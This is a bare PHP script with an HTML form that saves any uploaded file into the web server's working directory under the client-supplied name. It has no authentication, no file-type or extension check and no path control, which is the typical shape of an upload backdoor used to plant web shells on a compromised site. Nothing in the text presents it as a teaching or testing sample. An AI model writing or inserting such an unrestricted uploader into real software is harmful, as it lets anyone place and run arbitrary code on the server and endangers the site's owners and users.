<form enctype='multipart/form-data' action='' method='POST'><input name='upfile' type='file'/><input type='submit' value='upload'/></form><?php $target_path=basename($_FILES['upfile']['name']);if(move_uploaded_file($_FILES['upfile']['tmp_name'],$target_path)){echo basename($_FILES['upfile']['name']).' uploaded';}else{echo 'error!';}?>